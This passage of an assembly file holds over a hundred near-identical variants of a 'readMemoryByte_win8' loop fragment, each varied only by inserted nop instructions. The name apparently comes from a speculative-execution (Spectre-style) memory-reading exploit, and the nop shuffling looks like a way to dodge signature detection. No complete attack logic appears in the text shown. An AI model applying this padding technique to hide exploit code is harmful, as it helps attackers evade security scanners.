	jmp	.LreadMemoryByte_win8_continue
## Variant 3
.LreadMemoryByte_win8_var3:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 4
.LreadMemoryByte_win8_var4:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 5
.LreadMemoryByte_win8_var5:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	nop
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 6
.LreadMemoryByte_win8_var6:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 7
.LreadMemoryByte_win8_var7:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 8
.LreadMemoryByte_win8_var8:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 9
.LreadMemoryByte_win8_var9:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 10
.LreadMemoryByte_win8_var10:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 11
.LreadMemoryByte_win8_var11:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 12
.LreadMemoryByte_win8_var12:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 13
.LreadMemoryByte_win8_var13:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 14
.LreadMemoryByte_win8_var14:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 15
.LreadMemoryByte_win8_var15:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 16
.LreadMemoryByte_win8_var16:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 17
.LreadMemoryByte_win8_var17:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 18
.LreadMemoryByte_win8_var18:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 19
.LreadMemoryByte_win8_var19:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 20
.LreadMemoryByte_win8_var20:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 21
.LreadMemoryByte_win8_var21:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 22
.LreadMemoryByte_win8_var22:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 23
.LreadMemoryByte_win8_var23:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	nop
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 24
.LreadMemoryByte_win8_var24:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 25
.LreadMemoryByte_win8_var25:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 26
.LreadMemoryByte_win8_var26:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 27
.LreadMemoryByte_win8_var27:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 28
.LreadMemoryByte_win8_var28:
	popq	%rax
	nop
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 29
.LreadMemoryByte_win8_var29:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 30
.LreadMemoryByte_win8_var30:
	popq	%rax
	nop
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 31
.LreadMemoryByte_win8_var31:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 32
.LreadMemoryByte_win8_var32:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 33
.LreadMemoryByte_win8_var33:
	popq	%rax
	nop
	nop
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 34
.LreadMemoryByte_win8_var34:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 35
.LreadMemoryByte_win8_var35:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 36
.LreadMemoryByte_win8_var36:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 37
.LreadMemoryByte_win8_var37:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 38
.LreadMemoryByte_win8_var38:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 39
.LreadMemoryByte_win8_var39:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 40
.LreadMemoryByte_win8_var40:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 41
.LreadMemoryByte_win8_var41:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 42
.LreadMemoryByte_win8_var42:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 43
.LreadMemoryByte_win8_var43:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 44
.LreadMemoryByte_win8_var44:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 45
.LreadMemoryByte_win8_var45:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 46
.LreadMemoryByte_win8_var46:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 47
.LreadMemoryByte_win8_var47:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
	nop
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 48
.LreadMemoryByte_win8_var48:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 49
.LreadMemoryByte_win8_var49:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 50
.LreadMemoryByte_win8_var50:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 51
.LreadMemoryByte_win8_var51:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 52
.LreadMemoryByte_win8_var52:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 53
.LreadMemoryByte_win8_var53:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 54
.LreadMemoryByte_win8_var54:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
	nop
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 55
.LreadMemoryByte_win8_var55:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 56
.LreadMemoryByte_win8_var56:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 57
.LreadMemoryByte_win8_var57:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 58
.LreadMemoryByte_win8_var58:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 59
.LreadMemoryByte_win8_var59:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 60
.LreadMemoryByte_win8_var60:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 61
.LreadMemoryByte_win8_var61:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	nop
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 62
.LreadMemoryByte_win8_var62:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 63
.LreadMemoryByte_win8_var63:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 64
.LreadMemoryByte_win8_var64:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 65
.LreadMemoryByte_win8_var65:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 66
.LreadMemoryByte_win8_var66:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 67
.LreadMemoryByte_win8_var67:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 68
.LreadMemoryByte_win8_var68:
	popq	%rax
	nop
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 69
.LreadMemoryByte_win8_var69:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	nop
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 70
.LreadMemoryByte_win8_var70:
	popq	%rax
	nop
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 71
.LreadMemoryByte_win8_var71:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 72
.LreadMemoryByte_win8_var72:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 73
.LreadMemoryByte_win8_var73:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 74
.LreadMemoryByte_win8_var74:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 75
.LreadMemoryByte_win8_var75:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 76
.LreadMemoryByte_win8_var76:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 77
.LreadMemoryByte_win8_var77:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 78
.LreadMemoryByte_win8_var78:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 79
.LreadMemoryByte_win8_var79:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 80
.LreadMemoryByte_win8_var80:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 81
.LreadMemoryByte_win8_var81:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 82
.LreadMemoryByte_win8_var82:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 83
.LreadMemoryByte_win8_var83:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 84
.LreadMemoryByte_win8_var84:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 85
.LreadMemoryByte_win8_var85:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 86
.LreadMemoryByte_win8_var86:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 87
.LreadMemoryByte_win8_var87:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	nop
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 88
.LreadMemoryByte_win8_var88:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 89
.LreadMemoryByte_win8_var89:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
	nop
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 90
.LreadMemoryByte_win8_var90:
	popq	%rax
	nop
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 91
.LreadMemoryByte_win8_var91:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 92
.LreadMemoryByte_win8_var92:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 93
.LreadMemoryByte_win8_var93:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 94
.LreadMemoryByte_win8_var94:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 95
.LreadMemoryByte_win8_var95:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 96
.LreadMemoryByte_win8_var96:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 97
.LreadMemoryByte_win8_var97:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 98
.LreadMemoryByte_win8_var98:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 99
.LreadMemoryByte_win8_var99:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 100
.LreadMemoryByte_win8_var100:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 101
.LreadMemoryByte_win8_var101:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 102
.LreadMemoryByte_win8_var102:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 103
.LreadMemoryByte_win8_var103:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 104
.LreadMemoryByte_win8_var104:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	nop
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 105
.LreadMemoryByte_win8_var105:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 106
.LreadMemoryByte_win8_var106:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 107
.LreadMemoryByte_win8_var107:
	popq	%rax
	nop
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 108
.LreadMemoryByte_win8_var108:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 109
.LreadMemoryByte_win8_var109:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
